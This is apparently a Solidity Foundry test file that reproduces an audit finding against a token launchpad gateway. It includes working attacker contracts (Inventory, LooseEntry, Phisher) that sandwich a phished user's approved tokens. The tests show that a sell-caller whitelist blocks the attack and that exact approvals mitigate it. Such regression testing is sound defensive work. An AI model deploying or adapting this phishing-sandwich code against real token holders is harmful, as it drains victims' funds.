// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";

import {GangFixture} from "../utils/GangFixture.sol";
import {IGangLaunchpad} from "../../src/gang/interfaces/IGangLaunchpad.sol";
import {GangLaunchpad} from "../../src/gang/GangLaunchpad.sol";
import {GangPadRegistry} from "../../src/gang/GangPadRegistry.sol";
import {GangGateway} from "../../src/router/GangGateway.sol";
import {IGangGateway} from "../../src/router/interfaces/IGangGateway.sol";
import {GangRouterDeployLib as R} from "../../script/GangRouterDeployLib.sol";
import {GangPadRegistryDeployLib as RG} from "../../script/GangPadRegistryDeployLib.sol";
import {GangGatewayDeployLib as G} from "../../script/GangGatewayDeployLib.sol";

/// @dev Attacker inventory wallet (from the 2026-10-30 independent audit, M-1): an Agent-holding account whose code
///      anyone (the phisher) can drive. On mainnet this is an Agent-ID EOA delegated with EIP-7702, or a bundle [sell
///      inventory, victim tx, buy back].
contract Inventory {
    GangLaunchpad public immutable pad;
    IERC20 public immutable wbnb;

    constructor(GangLaunchpad pad_, IERC20 wbnb_) {
        pad = pad_;
        wbnb = wbnb_;
        wbnb_.approve(address(pad_), type(uint256).max);
    }

    function buy(address t, uint256 q) external returns (uint256) {
        return pad.buy(t, q, 0);
    }

    function sellAll(address t) external {
        IERC20(t).approve(address(pad), type(uint256).max);
        pad.sell(t, IERC20(t).balanceOf(address(this)), 0);
    }

    /// @dev buy back (at least) `a` tokens: CurveLogic's inverse, gross of the 1% fee
    function buyBack(address t, uint256 a) external {
        (,, uint128 rq, uint128 sold,, uint128 vq,,,,,,) = pad.curves(t);
        uint256 VT = pad.VIRTUAL_TOKEN();
        uint256 k = uint256(vq) * VT;
        uint256 net = Math.ceilDiv(k, VT - sold - a) - (uint256(vq) + rq);
        uint256 gross = Math.ceilDiv(net * 10_000, 9_900) + 1;
        pad.buy(t, gross, a);
    }
}

/// @dev An aggregator entry that must never be whitelisted (§23.9): anyone calls it and names the seller.
contract LooseEntry {
    IGangGateway immutable gw;

    constructor(IGangGateway gw_) {
        gw = gw_;
    }

    function sellFor(address t, address seller, uint256 amount) external {
        gw.sellToken(0, t, seller, amount, 0, 500, msg.sender);
    }
}

contract Phisher {
    IGangGateway immutable gw;

    constructor(IGangGateway gw_) {
        gw = gw_;
    }

    /// @dev Dump the inventory, sell the victim (tx.origin) with no minimum — straight on the gateway, or through
    ///      `entry` when given — then buy the inventory back.
    function claim(address t, Inventory[] calldata inv, uint256[] calldata held, LooseEntry entry) external {
        for (uint256 i; i < inv.length; i++) {
            inv[i].sellAll(t);
        }
        uint256 bal = IERC20(t).balanceOf(tx.origin);
        if (address(entry) == address(0)) gw.sellToken(0, t, tx.origin, bal, 0, 500, address(this));
        else entry.sellFor(t, tx.origin, bal);
        for (uint256 i; i < inv.length; i++) {
            inv[i].buyBack(t, held[i]);
        }
    }

    receive() external payable {}
}

/// @notice Audit M-1 (AUDIT-BRIEF §25): a contract the user is tricked into calling dumps the attacker's own inventory
///         on the curve, force-sells the user's approved tokens with no minimum at the depressed price, and buys the
///         inventory back — all in the user's tx. The sell-caller whitelist stops it (the phisher is not listed). The
///         same attack through a whitelisted entry that lets anyone name the seller (what the listing review must
///         refuse) shows why: the loss is bounded by the attacker's inventory, not by the 5% router fee. Exact
///         approvals (spent to 0 by each sell) leave nothing to force-sell even then.
contract GangGatewayPhishingTest is GangFixture {
    GangPadRegistry internal reg;
    GangGateway internal gw;
    address internal creator;
    address internal alice;

    function setUp() public {
        _deployGang(makeAddr("keeper"));
        address[] memory pads = new address[](1);
        pads[0] = address(pad);
        reg = GangPadRegistry(RG.deploy(owner, pads).proxy);
        G.Gateway memory stack = G.deploy(address(reg), address(wbnb), owner, R.MAINNET_MIN_DELAY);
        gw = GangGateway(payable(stack.proxy));
        vm.prank(owner);
        pad.setRouter(address(gw), true);
        creator = _newAgent();
        alice = _newAgent();
    }

    function _push(address t, uint256 target) internal {
        for (uint256 i; i < 2000 && _curveRealQuote(t) < target; i++) {
            address w = _newAgent();
            vm.prank(w);
            pad.buy(t, 0.5 ether, 0);
        }
    }

    function _inventory(address t, uint256 n) internal returns (Inventory[] memory inv, uint256[] memory held) {
        inv = new Inventory[](n);
        held = new uint256[](n);
        for (uint256 i; i < n; i++) {
            inv[i] = new Inventory(pad, IERC20(address(wbnb)));
            agents.mint(address(inv[i]), 10_000 + _nextAgentId++);
            wbnb.mintUnlimited(address(inv[i]), 100 ether);
            inv[i].buy(t, 5 ether); // capped at 10M tokens
            held[i] = IERC20(t).balanceOf(address(inv[i]));
        }
    }

    function _wbnbOf(Inventory[] memory inv) internal view returns (uint256 s) {
        for (uint256 i; i < inv.length; i++) {
            s += wbnb.balanceOf(address(inv[i]));
        }
    }

    /// @return lossBps the victim's loss against a fair sell with no router fee
    /// @return attackerPnl what the attacker gained (inventory WBNB change + router fee)
    function _sandwich(uint256 progress, uint256 n) internal returns (uint256 lossBps, int256 attackerPnl) {
        LooseEntry entry = new LooseEntry(IGangGateway(address(gw)));
        vm.prank(owner);
        gw.setCaller(address(entry), true);
        // the 15 BNB target (1.0's): `progress` up to 10 BNB keeps the curve live
        vm.prank(creator);
        address t = pad.createWithGradTarget(
            "Curve", "CRV", "logo", "meta", address(0), address(0), _tax(0, 0, 0, address(0)), 15 ether
        );
        _push(t, progress);
        // victim at the 1% cap, unlimited approval to the gateway
        vm.prank(alice, alice);
        gw.buyTokenAMAP{value: 5 ether}(t, alice, 5 ether, 0);
        uint256 y = IERC20(t).balanceOf(alice);
        vm.prank(alice);
        IERC20(t).approve(address(gw), type(uint256).max);
        (Inventory[] memory inv, uint256[] memory held) = _inventory(t, n);

        uint256 snap = vm.snapshotState();
        uint256 b0 = alice.balance;
        vm.prank(alice, alice);
        gw.sellToken(0, t, alice, y, 0, 0, address(0));
        uint256 fair = alice.balance - b0;
        vm.revertToState(snap);

        Phisher ph = new Phisher(IGangGateway(address(gw)));
        uint256 w0 = _wbnbOf(inv);
        b0 = alice.balance;
        vm.prank(alice, alice);
        vm.expectRevert(IGangGateway.NotWhitelisted.selector);
        ph.claim(t, inv, held, LooseEntry(address(0))); // straight on the gateway: blocked
        vm.prank(alice, alice);
        ph.claim(t, inv, held, entry); // through a wrongly whitelisted loose entry
        uint256 got = alice.balance - b0;
        for (uint256 i; i < n; i++) {
            assertGe(IERC20(t).balanceOf(address(inv[i])), held[i], "inventory restored");
        }
        assertEq(IERC20(t).balanceOf(alice), 0, "victim sold out");
        lossBps = ((fair - got) * 10_000) / fair;
        attackerPnl = int256(_wbnbOf(inv)) - int256(w0) + int256(address(ph).balance);
    }

    /// @dev The phisher on its own, with inventory on the curve: NotWhitelisted, the victim keeps everything.
    function test_sandwich_phisherAloneIsBlocked() public {
        address t = _createV3(creator, address(0), _tax(0, 0, 0, address(0)));
        vm.prank(alice, alice);
        gw.buyTokenAMAP{value: 0.05 ether}(t, alice, 0.05 ether, 0);
        uint256 y = IERC20(t).balanceOf(alice);
        vm.prank(alice);
        IERC20(t).approve(address(gw), type(uint256).max);
        (Inventory[] memory inv, uint256[] memory held) = _inventory(t, 2);
        Phisher ph = new Phisher(IGangGateway(address(gw)));
        vm.prank(alice, alice);
        vm.expectRevert(IGangGateway.NotWhitelisted.selector);
        ph.claim(t, inv, held, LooseEntry(address(0)));
        assertEq(IERC20(t).balanceOf(alice), y);
    }

    /// @dev Why a loose entry must never be listed.
    function test_sandwich_oneWallet_lossAboveRouterFee() public {
        (uint256 lossBps, int256 pnl) = _sandwich(7 ether, 1);
        assertGt(lossBps, 500, "beyond the 5% router fee");
        assertGt(pnl, 0, "attacker profits");
    }

    function test_sandwich_fiveWallets_lossGrowsWithInventory() public {
        (uint256 lossBps, int256 pnl) = _sandwich(10 ether, 5);
        assertGt(lossBps, 2_500, "a quarter and more");
        assertGt(pnl, 0, "attacker profits");
    }

    /// @dev The mitigation the integration guide asks for: an exact approval is spent by the user's own sell, so a
    ///      later phishing call finds nothing to sell.
    function test_exactApproval_leavesNothingToForceSell() public {
        address t = _createV3(creator, address(0), _tax(0, 0, 0, address(0)));
        vm.prank(alice, alice);
        gw.buyTokenAMAP{value: 0.02 ether}(t, alice, 0.02 ether, 0);
        uint256 y = IERC20(t).balanceOf(alice);
        vm.prank(alice);
        IERC20(t).approve(address(gw), y / 2);
        vm.prank(alice, alice);
        gw.sellToken(0, t, alice, y / 2, 0, 0, address(0));
        assertEq(IERC20(t).allowance(alice, address(gw)), 0);

        Phisher ph = new Phisher(IGangGateway(address(gw)));
        LooseEntry entry = new LooseEntry(IGangGateway(address(gw)));
        vm.prank(owner);
        gw.setCaller(address(entry), true);
        Inventory[] memory none = new Inventory[](0);
        vm.prank(alice, alice);
        vm.expectRevert();
        ph.claim(t, none, new uint256[](0), entry);
        assertEq(IERC20(t).balanceOf(alice), y - y / 2, "the rest is untouched");
    }
}
